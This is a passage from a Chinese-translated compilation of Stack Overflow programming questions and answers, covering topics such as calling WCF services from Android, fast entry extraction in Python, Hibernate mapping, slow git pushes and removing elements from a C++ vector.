        public string BloodGroup { get; set; }
    }
} 
```

这是web.config

```
<?xml version="1.0"?>
<configuration>

  <system.web>
    <compilation debug="true" targetFramework="4.0" />
  </system.web>
  <system.serviceModel>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <!-- To avoid disclosing metadata information, set the value below to false and remove the metadata endpoint above before deployment -->
          <serviceMetadata httpGetEnabled="true"/>
          <!-- To receive exception details in faults for debugging purposes, set the value below to true.  Set to false before deployment to avoid disclosing exception information -->
          <serviceDebug includeExceptionDetailInFaults="false"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
    <services>
      <service name="EmployeeService.EmployeeInfo">
        <endpoint kind="webHttpEndpoint"
        contract="EmployeeService.IEmployeeInfo" />
      </service>
    </services>
  </system.serviceModel>
 <system.webServer>
    <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer>

</configuration> 
```

安卓方法

```
try {
            String SERVICE_URI = "http://192.168.1.4:1234/Employeeinfo.svc";

            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpGet request = new HttpGet(SERVICE_URI + "/GetEmployee/11");

            request.setHeader("Accept", "application/json");
            request.setHeader("Content-type", "application/json");

            HttpResponse response = httpClient.execute(request);

            HttpEntity responseEntity = response.getEntity();

            // Read response data into buffer
            char[] buffer = new char[(int)responseEntity.getContentLength()];
            InputStream stream = responseEntity.getContent();
            InputStreamReader reader = new InputStreamReader(stream);
            reader.read(buffer);
            stream.close();

            JSONObject Emp = new JSONObject(new String(buffer));

            // Populate text fields
            ed1.setText(Emp.getString("Address"));
            ed2.setText(Emp.getString("BloodGroup"));
            ed3.setText(Emp.getString("EmployeeId"));
            ed4.setText(Emp.getString("FirstName"));
            ed5.setText(Emp.getString("LastName"));

        }
        catch (Exception e) {
            e.printStackTrace();
  lblStatus.setText(e.getMessage());
        } 
```

我工作了好几天来学习如何从 android 应用程序调用 WCF 服务，我正在这里...请帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:38:14.547

只需将此值的大小增加为图像上显示的 6553600。 ![在此处输入图像描述](../Images/77de09eb2749312942f95bc7b6e31240.png)

```
WebGet(UriTemplate = "GetEmployee/{employeeId}",
            BodyStyle = WebMessageBodyStyle.WrappedRequest,
            ResponseFormat = WebMessageFormat.Json,
Method="GET",
            RequestFormat = WebMessageFormat.Json)] 
```

# java - 我们可以为JVM编写插件吗

> ID：15562557
> 
> 赞同：0
> 
> 时间：2013-03-22T04:05:10.093
> 
> 标签：java, plugins, jvm

是否可以为 JVM(Oracle) 编写插件？如果可以，那么我们可以使用哪种语言。我认为主要是C++。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:08:11.697

您想自定义 JVM 本身吗？或者只是调用本机代码？

*   如果是前者，您最好从 OpenJDK 开始，它是开源的，您可以根据自己的喜好对其进行自定义。但这将是很多工作：你确定你真的需要这样做吗？
*   如果是后者，那肯定是可能的，而且相对容易：看看[Java Native Access](http://en.wikipedia.org/wiki/Java_Native_Access)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:13:20.243

在我看来，最接近 JVM 的“插件”的是注解处理器或 Java 代理。Annotation Processor 可以“扩展”编译器，例如执行一些自定义验证步骤，或生成额外的源代码。代理是一个运行时组件，例如，它可以拦截类加载并在加载类时发出字节码，以及其他使用领域。

# python - 搜索名称并从大文件中提取相应条目 - 最快的方法 - Python 和 Regex

> ID：15562561
> 
> 赞同：2
> 
> 时间：2013-03-22T04:05:36.270
> 
> 标签：python, regex, performance, runtime, multiprocessing

我正在寻找一种更好（更快）的方法来从巨大的文本文件中识别特定条目，而不是提取与该条目对应的行。该文件格式为：

```
>Entry1.1
#size=1688
704 1   1   1   4
979 2   2   2   0
1220    1   1   1   4
1309    1   1   1   4
1316    1   1   1   4
1372    1   1   1   4
1374    1   1   1   4
1576    1   1   1   4
>Entry2.1
#size=6251
6110    3   1.5 0   2
6129    2   2   2   2
6136    1   1   1   4
6142    3   3   3   2
6143    4   4   4   1
6150    1   1   1   4
6152    1   1   1   4
>Entry3.2
#size=1777
AND SO ON----------- 
```

我减少了每个条目对应的行数（上图），因为它们从几百到几千不等。包含所有这些条目的文件大小范围从 100 MB 到 600 MB。我通常需要识别和提取相应行的条目数从几百到 15,000 不等。目前我正在使用 REGEX 来识别条目名称，然后提取所有相应的行直到下一个“>”符号。为了加快进程，我在 python 3.0 中使用了“多处理”包。这是简化的代码：

```
def OldMethod(entry):##Finds entry and extracts corresponding lines till next '>'
    patbase = '(>*%s(?![^\n]+?\d).+?)(?=>|(?:\s*\Z))'###pattern for extraction of gene entry
    found = re.findall(patbase % entry, denfile, re.DOTALL)
    if found: 
        print ('Entry found in density file\n')
        ''Do processing of corresponding line''
    return processed_result

def NewMethod(entry):##As suggested in this thread
    name = entry[1]
    block = den_dict[name]
    if found:
        ''Do processing of correponding lines in Block''

def PPResults(module,alist):##Parallel processing
    npool = Pool(int(nproc))    
    res = npool.map_async(module, alist)
    results = (res.get())###results returned in form of a list 
    return results

main():
    ##Read Density file, split by '>' and make dictionary for key and corresponding lines
    fh_in = open(density_file, 'r') ###HUGE TEXT FILE
    denfile = fh_in2.read().split('>')[1:] ###read once use repeatedly
    global den_dict
    den_dict = {}
    for ent in denfile:
        ent_splt = ent.split('\n')
        den_dict[ent_splt[0]] = ent_splt[2:-1]
    ##Use new approach with multiprocess
    results = PPResults(NewMethod, a_list)###'a_list' holds entries for that proceesing needs to be done
    for i in results:##Write Results from list to file
        fh_out.write(i) 
```

我在具有超过 500GB 和 42 个内核的服务器上运行它，但脚本仍然需要大量时间（几小时甚至一天），具体取决于要处理的大文件的大小和数量条目。在整个过程中，大部分时间都花在了定位特定条目上，因为条目的处理非常基础。

我想要实现的是尽可能减少运行时间。请建议我执行此分析的最快策略是什么。

结果：

在遵循“Janne Karila”的建议（下）并使用“NewMethod”（上）后，300 个条目的运行时间为 120 秒，其中包括 85 秒来读取巨大的密度文件并由 '>' == 35 秒分割以使用处理 300 个条目32个核心。

与 REGEX 一起使用“OldMethod”（上图）时，300 个条目的运行时间为 577 秒，其中包括 ~102 秒来读取巨大的密度文件 == 475 秒以使用 32 个内核处理 300 个条目。

读取大文件的时间从 12 秒到 102 秒波动，原因我不确定。最终，新方法至少快了 10~12 倍。目前看来是不错的改进。

谢谢

AK

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T05:55:15.707

您的主要问题是您尝试对整个文件进行正则表达式，这需要大量时间。

1.  你不应该阅读整个文件，`.readlines()`而是使用
2.  将文件拆分为行后，您可以通过仅检查行中的第一个符号来轻松找到新条目，并且仅当此符号为“>”时，应用正则表达式来提取条目号等等。
3.  然后再一次，您只需遍历行列表，直到第一个符号变为“>”然后停止。

一个 600MB 的文件所用的时间不应超过 20 秒。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T06:12:28.040

可以通过提前将文件拆分为文件系统中的单个文件或将数据集导入数据库来实现“尽可能快”。这在实践中是否有意义取决于数据的寿命和您的使用模式。如果您平均处理一个数据集超过 2 到 3 次，那么在第一次需要它时预先支付拆分整个文件的费用是有意义的，然后或多或少地免费获得对相同数据的后续查询。

考虑到实现开销，并考虑到您可以通过更简单的方法将执行时间减少几个数量级，我不会尝试进行重大改革，除非您查询相同的数据集数千次。

对于简单的拆分，[`man csplit`](http://linux.die.net/man/1/csplit). 该程序使用起来有点棘手，因此您可能需要的不仅仅是手册页。

无论如何，分裂的时间听起来严重错误。您应该通过一次读取一行而不是尝试将整个文件读入核心来将其缩短到几分钟。

```
awk -v id="Entry1.1" '/^>/{p=($0 == ">" id)}p' file 
```

这应该转化为大约十几行 Python。这是一个概念证明（例如，如果您不熟悉 Awk 并想了解上面的内容）；它可能不是最优雅或最惯用的 Python。

```
import sys, fileinput, os
entry = sys.argv[1]
p = False
for line in fileinput.input(sys.argv[2:]):
    line = line.rstrip(os.linesep)
    if line[0] == '>':
        if line[1:] == entry:
            p = True
        else:
            p = False
    if p:
        print line 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T09:52:34.213

您可以将文件拆分为块，`>`并将它们存储在按条目名称索引的字典中。

```
d = dict(chunk.split(None,1) for chunk in denfile.split('>') if chunk) 
```

查找条目就是`d["Entry1.1"]`

* * *

编辑：由于您花费大量时间阅读文件，因此您应该尝试在那段时间内并行完成处理。您不需要将整个文件存储在任何地方；只需在文件中遇到每个想要的条目后立即将其发送到处理。

```
def NewMethod(entry):
    '''Do processing of correponding lines in Block'''

def retrieve_chunks(filename, alist):
    '''Generator that yields entries from file when entry name is in alist'''
    aset = set(alist)   #use a set for fast lookups
    chunk = None
    with open(filename) as f:
        for line in f:
            if line.startswith('>'):
                if chunk:
                    yield chunk
                name = line[1:].strip() 
                if name in aset:
                    chunk = [name] #enables capture of subsequent lines
                else:
                    chunk = None   #disables capture
            elif chunk:
                chunk.append(line)
    if chunk:
        yield chunk

main():
    npool = Pool(int(nproc))
    results = []
    for entry in retrieve_chunks(density_file, a_list): 
        results.append(npool.apply_async(NewMethod, (entry,)))

    for proxy in results:
        fh_out.write(proxy.get()) 
```

请注意，顺便说一句，如果您将生成器传递给`Pool.map_async`，它会在开始任何工作之前读取所有内容。这就是我`apply_async`在循环中使用的原因。

# hibernate - Hibernate Mapping - 使用属性作为键的简单查找表

> ID：15562563
> 
> 赞同：0
> 
> 时间：2013-03-22T04:05:56.560
> 
> 标签：hibernate

我被以下类的hibenate映射困住了

```
public class Order {
    private String orderNumber;
    private List<Component> Components = new ArrayList<Component>();
}

public class Component{
   private String orderNumber;
   private String partNumber;
   private Integer rowNum;
   private Part product;
}

public class Part{
    private String partNumber;
    private String barcodeNumber
    private Barcode barcode;
}
public class Barcode {
    private String barcodeNumber;
    private String itemBarcode;
    private String boxBarcode;
} 
```

休眠映射

命令

```
<class name="Order" table="Order" node="order" lazy="true">
    <id name="partNumber" unsaved-value="undefined" node="@partNumber">
        <column name="partNumber" not-null="true" />
    </id>
    <bag name="Components" lazy="true" outer-join="false" fetch="select">
        <key column="_PARENT" />
        <one-to-many class="Component" />
    </bag>
</class> 
```

零件

```
<class name="Component" table="component" node="order" lazy="true">
    <composite-id unsaved-value="undefined">
        <key-property name="enumber">
            <column name="_PARENT" not-null="true" />
   </key-property>
   <key-property name="rowNum" >
       <column name="_ROWNUM" not-null="true" />
   </key-property>
         <key-property name="rpn" >
             <column name="RPN" not-null="true" />
         </key-property>
    </composite-id>
    <property name="partNumber" node="@partNumber">
        <column name="partNumber" />
    </property>
    <many-to-one lazy="proxy" fetch="join" update="false" insert="false" name="part" class="Part" column="partNumber" node="part" embed-xml="true"></many-to-one>
</class> 
```

部分

```
<class name="Part" table="Part" node="part" lazy="true">
    <meta attribute="implement-equals">true</meta>
    <cache usage="read-only"/>
    <id name="cpn" type="string" unsaved-value="undefined" node="@cpn">
        <column name="CPN" not-null="true" />
    </id>     
    <property name="barcodeNumber" type="string" node="@barcodeNumber">
        <column name="barcodeNumber" not-null="false" />
    </property>
    <many-to-one  name="Barcode" foreign-key="barcodeNumber" class="Barcode" fetch="select"/>
</class> 
```

条码

```
<class name="Barcode" table="Barcode" node="barcode" lazy="true">
    <id name="barcodeNumber" unsaved-value="undefined" node="@barcodeNumber">
      <column name="barcodeNumber" not-null="true" />
    </id>
    <property name="itemBarcode" type="string" node="@itemBarcode">
        <column name="itemBarcode" />
    </property>
    <property name="boxBarcode" type="string" node="@boxBarcode">
        <column name="boxBarcode"  />
    </property> 
</class> 
```

我遇到的问题是 Part 和 Barcode 类 Part 有一个特殊的barcodeNumber 将 Barcode 链接到 Part 我无法更改数据结构，但想将这些表连接在一起以便我可以显示订单列表有组件和零件和条形码

映射通过初始加载，但在检索列表时系统失败 org.hibernate.PropertyAccessException: IllegalArgumentException 发生调用 Barcode.barcodeNumber 的 getter

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:21:48.317

这是getter方法的问题`barcodeNumber`

它应该是

```
 getBarcodeNumber(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T06:12:28.290

您必须添加 getter 和 setter。更改您的代码

**从**

```
 private Barcode barcode; 
```

**到**

```
 private Barcode barcode = new Barcode(); 
```

# ruby-on-rails - ruby on rails 中 nil:NilClass 的未定义方法“map”

> ID：15562568
> 
> 赞同：0
> 
> 时间：2013-03-22T04:06:30.233
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, ruby-on-rails-3.2

当我评论以下代码时

```
 <script type="text/javascript">

     // var data1= "<%=[@properties.map {|c| {time:c.time.strftime("%H").to_i , speed:c.speed}}].to_json%>"

    //var data=JSON.parse(data1.replace(/&quot;/g,'"'));

    //alert("dataset-------------------"+data);
</script> 
```

显示以下错误。为什么在我评论代码后会发生此错误。同时删除以下错误后的评论也会发生。

```
 ActionView::Template::Error (undefined method `map' for nil:NilClass):
        48: <div id="bar-demo" align="center">
        49: <script type="text/javascript">
        50: 
        51:  // var data1= "<%=[@properties.map {|c| {time:c.time.strftime("%H").to_i , speed:c.speed}}].to_json%>"
        52: 
        53: 
        54: //var data=JSON.parse(data1.replace(/&quot;/g,'"'));
      app/views/static_pages/show.html.erb:51:in `_app_views_static_pages_show_html_erb__413296487_31443192 
```

'

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:22:39.173

`ActionView`尝试评估嵌入式 Ruby时发生错误。在此阶段可能发生的任何错误之外的任何内容`<%= ... %>`或`<% ... %>`与此无关的任何内容。特别是`//`与任何事情无关。`ActionView`只有当嵌入的 Ruby 被成功评估，生成的 HTML 文档被控制器发送到客户端的浏览器，然后 HTML 被渲染/JavaScript 被浏览器执行时，这些评论才会生效——只有这样评论才会生效有效果，即跳过设置`data1`变量。

您的问题是，在呈现模板时，实例变量`@properties`是`nil`. 你有类似的东西`StaticPagesController`吗`show`？在那个动作中，你在哪里设置`@properties`？

# java - 将 String 转换为 Double 并将其放入 Stack

> ID：15562570
> 
> 赞同：0
> 
> 时间：2013-03-22T04:06:42.230
> 
> 标签：java

我有这个表达式，例如： `400 2.11 +` 我尝试将实数推入堆栈，当我这样做时，它会在这部分代码中显示错误

```
ch = input.charAt(j);
if (ch >= '0' && ch <= '9' || ch == '.')
    temp = temp + ch;

else if (ch == ' ') {
    x = Double.parseDouble(temp);
    theStack.push(x);
    temp = "";
}
else {

...

public void push(double j) {
        stackArray[++top] = j;
    } 
```

这是消息

```
Exception in thread "main" java.lang.NumberFormatException: empty String
    at sun.misc.FloatingDecimal.readJavaFormatString(FloatingDecimal.java:1011)
    at java.lang.Double.parseDouble(Double.java:540)
    at ParsePost.doParse(ParsePost.java:26)
    at InfixApp.main(InfixApp.java:21) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T08:42:54.747

如果您知道数字之间的分隔符，也许您可​​以使用该`split(String regex)`功能。在这种情况下，一旦您指定了分隔符，您的职责就是检查`String[]`返回的`split`并找到算术符号。

我写了这个简单的类来测试我所说的：

```
import java.util.ArrayList;

public class StringParsing {

    public static void main(String[] args) {
        //Simple string to split
        String str = "444 6.12 +";
        String[] values = str.split(" ");
        ArrayList<Double> arr = new ArrayList<Double>();
        for(int i = 0; i < values.length; i++) {
            //I check only for +
            if(!values[i].contains("+")) {
                Double d = Double.parseDouble(values[i]);
                arr.add(d);
            }
        }
        for(int i = 0; i < arr.size(); i++)
            //Add 1 to number for verify the correctness
            System.out.println("Double: "+(arr.get(i)+1.0));
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:13:21.560

这是一个关于空字符串的错误，错误中明确提到了。这里“temp”变量的值为`Double.parseDouble(temp)`空。并且无法解析空字符串。所以它抛出了一个异常。要让它工作，你必须给出一个字符串形式的浮点数，该函数可以解析为这个函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:57:27.760

我已经用正确的初始化测试了你的代码，并推送了确切的输入字符串，它工作正常，不过我添加了一个 FOR 循环。

就像上面的建议一样，问题是您正在尝试将空字符串转换为双精度。

双 x = Double.parseDouble(temp);

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T04:14:08.087

我认为你的温度有问题..我认为温度是空的..

```
if(temp.trim().length()>0){
   x = Double.parseDouble(temp);
   theStack.push(x);

} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-22T04:15:55.613

```
ch = input.charAt(j);
                    if (ch >= '0' && ch <= '9' || ch == '.')
                        temp = temp + ch;

                    else if (ch == ' ') {
                        if (null != temp && temp.trim().length()>0) {
                            x = Double.parseDouble(temp.trim());
                        }
                        else
                        {
                            //Case where string is empty
                        }
                        theStack.push(x);
                        temp = "";
                    } 
```

试试这个希望它有帮助。

# java - Java - 无法从 CakeWalk 获取剪贴板数据 (midi)

> ID：15562571
> 
> 赞同：1
> 
> 时间：2013-03-22T04:06:58.033
> 
> 标签：java, clipboard, midi

我正在尝试获取从 CakeWalk midi 编辑器“复制”的剪贴板数据（在 Windows 中）。它们在剪贴板查看器中可见，并且可以粘贴到其他程序中，但我无法在 java 程序中获取它们。

当来自 cakewalk 的 midi 数据在剪贴板中时，以下代码片段返回空数组。例如，当从记事本复制文本时，它会返回多达 30 种“风味”。我究竟做错了什么？

```
import java.util.*;
import java.awt.*;
import java.awt.datatransfer.*;

public class TestClipboard {

    public static void main(String... args) {
        Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
        System.out.println(Arrays.toString(c.getContents(TestClipboard.class).getTransferDataFlavors()));

        c = Toolkit.getDefaultToolkit().getSystemSelection();
        System.out.println(Arrays.toString(c.getContents(TestClipboard.class).getTransferDataFlavors()));
    }

} 
```

# matlab - 在 Matlab 中可以打印哪些额外的字符（非 ASCII）？

> ID：15562572
> 
> 赞同：1
> 
> 时间：2013-03-22T04:06:58.187
> 
> 标签：matlab, character, printf

是否有可以使用 sprintf、fprintf 或 disp 打印的非 ASCII 字符的参考列表？

字符如：

```
° º ♦ ∎ ⊠ ❯ • 
```

如果我输入 disp('∆')

我得到一个空白回复，字符没有打印出来。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:11:06.343

你的意思是输出：

```
 char(1:255) 
```

请注意，在[Matlab 的 char](http://www.mathworks.nl/help/matlab/ref/char.html)中，只有前 127 个字符对应于（非扩展）ASCII，之后的任何内容都是 Unicode16。Matlab 不能正确显示它的原因是由于 Matlab 命令窗口默认情况下不能很好地处理 Unicode。无论如何，输出到文件的字符不应该有任何差异；这只是一个*显示*问题。

然而，未记录的 Matlab 大师[Yair Altman](https://stackoverflow.com/users/233829/yair-altman)（参见[undocumentedmatlab.com](http://undocumentedmatlab.com/blog/customizing-matlab-labels/)）展示了如何将 HTML 感知标签添加到绘图中。因此，您可以使用以下语法将 Unicode 字符放入此类标签中`&#xHEXCODE;`，例如：

```
figure;
labelStr=[ '<html> &deg; &diams; &#8718; &#8864; </html>'];
jLabel = javaObjectEDT('javax.swing.JLabel',labelStr);
[hcomponent,hcontainer] = javacomponent(jLabel,[100,100,40,20],gcf); 
```

# javascript - 在地图上显示恒定大小的叠加层

> ID：15562576
> 
> 赞同：0
> 
> 时间：2013-03-22T04:07:50.910
> 
> 标签：javascript, html, css, zoomooz

我正在我的网站上显示地图。地图图像设置为主分区的背景。我在这张地图上有一个网格覆盖（透明 png）。

我正在使用 zoomooz ( [http://janne.aukia.com/zoomooz/](http://janne.aukia.com/zoomooz/) ) 放大地图上不同的感兴趣区域。

目前，当我同时放大地图和叠加层时，我希望只有地图缩放，并将网格保持在恒定大小。

我已将叠加层上的定位设置为固定，但一切似乎仍然缩放在一起。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:21:52.807

Overlay 不能是那里的根文档的一部分，

请参阅您发送的文档中的设置代码，

```
// root element to zoom relative to
// (this element needs to be positioned)
root: $(document.body), // here enter the parent div you want to zoom. with respect to his it will zoom(like wrapper) 
```

我没有实际操作，因为您没有提供代码，而是将缩放应用于整个文档。然后一切都会放大，很简单。

您需要识别区域（div）并将其 id 指定为 root。“叠加层不得在该（div）内”否则将再次缩放。

我希望这会做:)

如需更多帮助，请创建小提琴和/或发布所有支持代码。

谢谢你

# c++ - 向量化短到浮点转换？

> ID：15562578
> 
> 赞同：4
> 
> 时间：2013-03-22T04:08:08.797
> 
> 标签：c++, visual-studio-2012, vectorization

我试图理解为什么 Visual Studio 2012 (x64) 不想矢量化从 a`short`到 a的转换`float`。有人有理由或解决办法吗？

```
//unsigned short* __restrict A,B,C,D    
for (int j = 0; j < H*W;j++) 
{
    float Gs = D[j]-B[j];
    float Gc = A[j]-C[j];
    in[j]=atan2f(Gs,Gc);
} 
```

> 信息 C5002：由于原因“1101”，循环未矢量化

**解析度**

使用短裤而不是矢量化的运行时是关于`800ms`

运行时转换为所有整数和自动矢量化大约是`140ms`（！！！）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:12:12.137

从此[页面](http://blogs.msdn.com/b/nativeconcurrency/archive/2012/05/22/auto-vectorizer-in-visual-studio-11-did-it-work.aspx)看来，您的“循环包含不可矢量化的转换操作（可能是隐式的）”。您是否尝试过首先转换为与 a 宽度相同的类型`float`（例如`int`）？

有关更具体的原因，请参见[此处](https://stackoverflow.com/questions/9161807/sse-convert-short-integer-to-float)。显然，在 SSE 中没有直接的方法将由 short 向量组成的 SSE 寄存器转换为浮点向量，但是有一条指令可以将 32 位整数转换为浮点数。

# android - 以块的形式保存位图图像

> ID：15562580
> 
> 赞同：1
> 
> 时间：2013-03-22T04:08:20.073
> 
> 标签：android, android-sdcard, save-image

我想将位图图像保存在 sd 卡中，我可以保存它，但有时我的活动因内存不足而被杀死。

那么我可以将图像保存在块中，而不是以字节数组的形式保存。

我的代码如下：

```
 try {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();

        b.compress(Bitmap.CompressFormat.JPEG, 40, bytes);

        File f = new File(Environment.getExternalStorageDirectory() + File.separator + "temp.jpg");
        if (f.exists()) {
            f.delete();
        }
        f.createNewFile();

        FileOutputStream fo = new FileOutputStream(f);
        fo.write(bytes.toByteArray());
        fo.flush();
        fo.close();

    } catch (Exception e) {

        e.printStackTrace();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:23:25.360

解决此问题的最佳方法是将图像大小缩小到所需的视图大小，并在后台线程（异步任务）上完成所有繁重的工作，当您的后台线程工作时，您可以显示任何虚拟图像形式资源，一旦图像被正确处理，用前一个替换你的位图。

阅读此内容后，在您继续之前

[有效地显示位图](http://developer.android.com/training/displaying-bitmaps/index.html)

[从 UI 线程处理位图](http://developer.android.com/training/displaying-bitmaps/process-bitmap.html)

[将缩小版本加载到内存中](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html#load-bitmap)

[管理位图内存](http://developer.android.com/training/displaying-bitmaps/manage-memory.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:35:53.593

为了减少这个问题，您可以做的一件事是调整图像的大小，然后将其保存到内存中。

下面是有帮助的代码。你可以试试下面的方法。

> ```
>  // decodes image and scales it to reduce memory consumption
> public static Bitmap decodeFile(File p_f)
> {
>     try
>     {
>         // decode image size
>         BitmapFactory.Options m_opt = new BitmapFactory.Options();
>         m_opt.inJustDecodeBounds = true;
>         BitmapFactory.decodeStream(new FileInputStream(p_f), null, m_opt);
>         // Find the correct scale value. It should be the power of 2.
>         final int REQUIRED_SIZE = 70;
>         int m_widthTmp = m_opt.outWidth, m_heightTmp = m_opt.outHeight;
>         int m_scale = 1;
>         while (true)
>         {
>             if (m_widthTmp / 2 < REQUIRED_SIZE || m_heightTmp / 2 < REQUIRED_SIZE) break;
>             m_widthTmp /= 2;
>             m_heightTmp /= 2;
>             m_scale *= 2;
>         }
>         // decode with inSampleSize
>         BitmapFactory.Options m_o2 = new BitmapFactory.Options();
>         m_o2.inSampleSize = m_scale;
>         return BitmapFactory.decodeStream(new FileInputStream(p_f), null, m_o2);
>     }
>     catch (FileNotFoundException p_e)
>     {
>     }
>     return null;
> } 
> ```

**编辑：**

您还可以检查 sdcard 中是否有可用空间，并根据可用空间将图像保存到 sdcard。我已经使用以下方法来获取可用的可用空间。

> ```
>  /**
>  * This function find outs the free space for the given path.
>  * 
>  * @return Bytes. Number of free space in bytes.
>  */
> public static long getFreeSpace()
> {
>     try
>     {
>         if (Environment.getExternalStorageDirectory() != null
>                 && Environment.getExternalStorageDirectory().getPath() != null)
>         {
>             StatFs m_stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
>             long m_blockSize = m_stat.getBlockSize();
>             long m_availableBlocks = m_stat.getAvailableBlocks();
>             return (m_availableBlocks * m_blockSize);
>         }
>         else
>         {
>             return 0;
>         }
>     }
>     catch (Exception e)
>     {
>         e.printStackTrace();
>         return 0;
>     }
> } 
> ```

使用上面的如下：

> ```
>  if (fileSize <= getFreeSpace())
>    {
>         //write your code to save the image into the sdcard.
>        } 
>        else
>        {
>          //provide message that there is no more space available.
>          } 
> ```

# git - Git - 为大型项目推送远程分支真的很慢

> ID：15562594
> 
> 赞同：15
> 
> 时间：2013-03-22T04:10:19.987
> 
> 标签：git

我们只是在我的工作中使用 git。我们有一个相当大的项目，其中有一些相当大的资源处于版本控制之下（~500MB）。

今天我们尝试将分支推送到远程服务器，但很惊讶 git 似乎正在尝试上传整个项目。我本来希望 git 只发送 4-5 个有更改的文本文件的增量（就像正常推送到 master 一样）。这不是远程分支的工作方式吗？我们使用`git push origin some_branch_name`了，在这种情况下是否有更好的命令可以使用？我们不应该在 git 中存储大量资源吗？如果不是，人们通常如何处理这种情况？有没有更好的方法让一名开发人员与另一名开发人员共享正在进行的工作而无需将更改提交到主分支？就目前而言，我们正在考虑大约 15 分钟来推送一个远程分支，这真的不可行。我们做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T10:29:22.640

你能用一些东西更新你的帖子吗？

为了更好地了解您的项目的外观，请发布以下前 10 多个条目：

```
git log --decorate=short --oneline --graph --all 
```

如果大型资源是二进制文件，那么不应该将它们存储在 git 中。如果这些二进制资源被更新，那么 git 那么它必须在内部对它们进行完整的复制，这是压缩算法不喜欢的，并将它们发送到服务器。至于如何处理它们，这取决于场景。你需要详细说明。

听起来您有多个开发人员在同一个遥控器上工作。这个对吗？如果是这样，任何开发人员都不应该直接承诺`master`（恕我直言，无论如何都不应该发生）。每个开发人员都可以拥有自己的命名分支。例如，开发人员 John 可以在`john/<branch_name>`. 这将有助于保持工作流程清洁。

此外，git 不适用于增量。每次更改时，它都会完整地存储文件。这可能看起来效率低下，但使用的压缩将大小保持在最低限度。它有助于更​​快地结帐和扫描日志历史记录。[阅读Git 基础知识](http://git-scm.com/book/en/Getting-Started-Git-Basics)的第一部分以获得可视化效果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-11-19T22:34:12.510

另一个因素可以解释`git push`性能不佳：

" `git push`" 用于在处理 refs 的旧值和新值列表时检查对象名称和 refnames 之间的歧义，这是不必要的（因为它知道它正在提供原始对象名称）。

请参阅[Derrick Stolee ( ) 的](https://github.com/derrickstolee)[提交 a4544b3](https://github.com/git/git/commit/a4544b311eab7c3ffd2aa96deb9be0b92df05ae2)（2018 年 11 月 6 日[）](https://github.com/derrickstolee)。 帮助者：[Jeff King (](https://github.com/peff) [)](https://github.com/peff)。^(（由)^([Junio C Hamano 合并](https://github.com/gitster))^([——](https://github.com/gitster))^在^([提交 1373999](https://github.com/git/git/commit/137399934da84ff8258c5ae8522006b5c1674eec))^(中，2018 年 11 月 19 日）)[`derrickstolee`](https://github.com/derrickstolee)
[`peff`](https://github.com/peff)
^([`gitster`](https://github.com/gitster))

> ## `pack-objects`: 忽略不明确的对象警告
> 
> 一个`git push`进程在其运行期间运行多个进程，但其中一个包括`git send-pack`哪些调用`git pack-objects`并使用对象 ID 将已知的拥有/想要传递到标准输入。
> 
> 但是，默认设置`core.warnAmbiguousRefs`需要`git pack-objects` 检查`ref_rev_parse_rules`与`refs.c`.
> 这意味着每个对象都至少触发了六个“文件是否存在？” 查询。
> 
> 当有很多参考时，这可能会显着增加！
> 我观察到一个简单的推送花了三秒钟检查这些路径。

这已通过 Git 2.20（2018 年第四季度）修复。

# c++ - 在保留顺序的同时从 Vector 中删除元素 - 需要更好的方法

> ID：15562595
> 
> 赞同：2
> 
> 时间：2013-03-22T04:10:23.187
> 
> 标签：c++, loops, vector

我正在尝试从 C++ 中的 Vector 中删除一个元素。在下面的代码中，我从 Vector 中的数字列表中删除了一个大于 10 的元素。我正在使用嵌套循环进行删除。有没有更好或更简单的方法来做同样的事情。

```
// removing an element from vector preserving order
#include <iostream>
#include <vector>
using namespace std;
int main() {
    vector<int> v {3,2,9,82,2,5,4,3,4,6};
    for (int i=0; i < v.size(); i++) {
        if (v[i] > 10) { // remove element > 10
            while (i < v.size()) {
                v[i] = v[i+1];
                i ++;
            }
        }
    }
    v.pop_back();
    for (int i=0; i < v.size(); i++) {
        cout << v[i] << "|";
    }
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T04:15:06.207

您可能想看看[std::remove_if](http://www.cplusplus.com/reference/algorithm/remove_if/)

```
bool is_higher_than_10(int i) { return i > 10; }
std::remove_if(v.begin(), v.end(), is_higher_than_10); 
```

因为总是有更多的东西要学，看看 chris 和 Benjamin Lindley 的评论和[Erase-remove 成语](http://en.wikipedia.org/wiki/Erase-remove_idiom)（谢谢大家）

```
v.erase(std::remove_if(v.begin(), v.end(), is_higher_than_10), v.end()); 
```

# c - C 编程：双精度的基本 fscanf 问题

> ID：15562599
> 
> 赞同：0
> 
